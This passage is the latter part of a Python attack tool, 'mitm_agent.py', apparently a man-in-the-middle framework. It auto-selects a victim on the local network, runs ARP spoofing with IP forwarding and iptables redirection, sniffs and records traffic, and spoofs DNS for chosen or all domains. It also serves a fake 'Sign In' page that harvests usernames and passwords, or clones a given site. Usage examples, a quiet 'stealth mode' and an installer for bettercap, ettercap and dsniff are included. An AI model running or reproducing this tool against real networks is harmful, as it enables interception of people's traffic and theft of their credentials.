            role = f"[{C.GREEN}GATEWAY{S.RESET_ALL}]"
        elif ip == ATTACKER_IP:
            role = f"[{C.YELLOW}US{S.RESET_ALL}]"
        else:
            role = f"[{C.WHITE}TARGET{S.RESET_ALL}]"
        print(f"  {C.WHITE}{ip:<20}{mac:<20}{role}{S.RESET_ALL}")

    # Find potential targets (exclude gateway and us)
    targets = [(ip, mac) for ip, mac in devices if ip not in [GATEWAY_IP, ATTACKER_IP]]
    if not targets:
        fatal("No potential targets found")

    # Auto-select first non-us, non-gateway device
    TARGET_IP = targets[0][0]
    TARGET_MAC = targets[0][1]
    GATEWAY_MAC = None

    # Resolve gateway MAC
    for ip, mac in devices:
        if ip == GATEWAY_IP:
            GATEWAY_MAC = mac
            break

    info(f"Auto-selected target: {TARGET_IP} ({TARGET_MAC})")
    return


def run_attack(args):
    """Main attack orchestrator."""
    global TARGET_IP, GATEWAY_IP, INTERFACE, ATTACKER_IP, ATTACKER_MAC, TARGET_MAC, GATEWAY_MAC, stats

    INTERFACE = args.interface
    stats["start_time"] = datetime.now().isoformat()

    # Setup signal handlers
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # Auto-discover or use provided
    if args.auto:
        auto_discover(INTERFACE)
    else:
        TARGET_IP = args.target
        GATEWAY_IP = args.gateway
        ATTACKER_IP = get_my_ip(INTERFACE)
        ATTACKER_MAC = get_my_mac(INTERFACE)

        if args.target_mac:
            TARGET_MAC = args.target_mac
        else:
            TARGET_MAC = resolve_mac(TARGET_IP, INTERFACE)

        if args.gateway_mac:
            GATEWAY_MAC = args.gateway_mac
        else:
            GATEWAY_MAC = resolve_mac(GATEWAY_IP, INTERFACE)

    if not ATTACKER_IP:
        fatal("Could not determine attacker IP")
    if not TARGET_IP or not GATEWAY_IP:
        fatal("Target and gateway required")

    print(banner())
    print(f"  {C.CYAN}Interface:{C.WHITE} {INTERFACE}{S.RESET_ALL}")
    print(f"  {C.CYAN}Attacker: {C.WHITE}{ATTACKER_IP} ({ATTACKER_MAC}){S.RESET_ALL}")
    print(f"  {C.CYAN}Target:   {C.WHITE}{TARGET_IP} ({TARGET_MAC or 'unknown'}){S.RESET_ALL}")
    print(f"  {C.CYAN}Gateway:  {C.WHITE}{GATEWAY_IP} ({GATEWAY_MAC or 'unknown'}){S.RESET_ALL}")
    print()

    # Step 1: Enable IP forwarding
    enable_ip_forwarding()

    # Step 2: Setup iptables if using redirect
    if args.redirect_port:
        setup_iptables(INTERFACE, TARGET_IP, args.redirect_port)

    # Step 3: Start ARP spoofing
    spoof_threads = start_arp_spoof(TARGET_IP, GATEWAY_IP, INTERFACE, TARGET_MAC, GATEWAY_MAC)

    # Step 4: Start packet sniffer
    sniffer = None
    if not args.no_sniff:
        filter_expr = f"(host {TARGET_IP} or host {GATEWAY_IP}) and tcp"
        sniffer = start_sniffer(INTERFACE, filter_expr)

    # Step 5: Start tcpdump for PCAP
    if args.pcap:
        start_tcpdump_log(INTERFACE)

    # Step 6: Start phishing server if requested
    phish_server = None
    if args.phish_port:
        ps = PhishingServer(port=args.phish_port)

        if args.phish_url:
            ps.load_from_url(args.phish_url)

        default_page = """<!DOCTYPE html><html><head><title>Login</title>
<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;}
form{width:320px;padding:40px;box-shadow:0 0 20px rgba(0,0,0,0.2);border-radius:8px;}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;}
h2{text-align:center;color:#333;}
</style></head><body>
<form method="POST" action="/login">
<h2>Sign In</h2>
<input type="text" name="username" placeholder="Username or Email" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Sign In</button>
</form></body></html>"""

        ps.load_page("/", default_page)
        phish_server = ps.start()

    # Step 7: Start DNS spoofing if requested
    dns_spoofer = None
    if args.dns_spoof:
        ds = DNSSpoofer(INTERFACE)
        if args.dns_spoof == "all":
            ds.add_spoof_all()
        else:
            for domain in args.dns_spoof.split(","):
                ds.add_spoof(domain.strip())
        dns_spoofer = ds.start()

    print(f"\n{C.GREEN}[✓] MITM Attack Running!{S.RESET_ALL}")
    if args.duration:
        info(f"Duration: {args.duration} seconds")
    print(f"  Press Ctrl+C to stop\n")

    # Live display
    if not args.quiet:
        display_thread = threading.Thread(target=live_display, daemon=True)
        display_thread.start()

    # Run for specified duration or until interrupted
    try:
        if args.duration:
            time.sleep(args.duration)
            info("Attack duration completed")
        else:
            while RUNNING:
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()


# ──────────────────────────────────────────────
# ARGUMENT PARSER
# ──────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        description="MITM Agent - Automated Man-in-the-Middle Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic ARP spoof + capture
  python3 mitm_agent.py --target 192.168.1.5 --gateway 192.168.1.1 -i eth0

  # Auto-discover everything
  python3 mitm_agent.py --auto -i wlan0

  # Full attack with all features
  python3 mitm_agent.py --auto -i eth0 --dns-spoof all --pcap --phish-port 8080

  # Specific duration
  python3 mitm_agent.py -t 192.168.1.5 -g 192.168.1.1 -i eth0 --duration 300

  # Stealth mode (no traffic print)
  python3 mitm_agent.py --auto -i wlan0 --quiet
        """
    )

    # Target specification
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-g", "--gateway", help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface",
                       default=get_default_interface())
    parser.add_argument("--target-mac", help="Target MAC address")
    parser.add_argument("--gateway-mac", help="Gateway MAC address")
    parser.add_argument("--auto", action="store_true",
                       help="Auto-discover target, gateway, and network")

    # Attack modules
    parser.add_argument("--dns-spoof", metavar="DOMAINS",
                       help="DNS spoofing: specify domains (comma-separated) or 'all'")
    parser.add_argument("--phish-port", type=int, metavar="PORT",
                       help="Start phishing server on given port")
    parser.add_argument("--phish-url", metavar="URL",
                       help="URL to clone for phishing page")
    parser.add_argument("--redirect-port", type=int, default=8080,
                       help="Redirect port for HTTP traffic (default: 8080)")

    # Capture options
    parser.add_argument("--pcap", action="store_true",
                       help="Save full PCAP capture")
    parser.add_argument("--no-sniff", action="store_true",
                       help="Disable live packet sniffing")

    # General options
    parser.add_argument("--duration", type=int, metavar="SECONDS",
                       help="Attack duration in seconds (default: infinite)")
    parser.add_argument("-q", "--quiet", action="store_true",
                       help="Quiet mode - no live traffic display")
    parser.add_argument("--setup", action="store_true",
                       help="Install all dependencies")

    return parser.parse_args()


def run_setup():
    """Run the setup/installation script."""
    script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "setup_kali.sh")
    if os.path.exists(script):
        os.system(f"bash {script}")
    else:
        # Run inline setup
        print("[*] Running setup...")
        os.system("apt-get update -qq")
        os.system("apt-get install -y bettercap ettercap-text-only dsniff mitmproxy nmap tcpdump dnsmasq python3-pip -qq 2>&1 | tail -3")
        os.system("pip3 install scapy colorama rich flask dnspython beautifulsoup4 lxml 2>&1 | tail -3")
        print("[✓] Setup complete")


# ──────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────
if __name__ == "__main__":
    args = parse_args()

    if args.setup:
        run_setup()
        sys.exit(0)

    if not HAS_SCAPY:
        warn("Scapy not installed. Some features limited.")
        print("  Install: pip3 install scapy")
        print("  Or run: python3 mitm_agent.py --setup")
        print()

    if not args.target and not args.auto:
        parser.print_help()
        print(f"\n{C.RED}Error: Specify --target or --auto{S.RESET_ALL}")
        sys.exit(1)

    if not args.auto and (not args.target or not args.gateway):
        print(f"{C.RED}Error: --target and --gateway required (or use --auto){S.RESET_ALL}")
        sys.exit(1)

    run_attack(args)
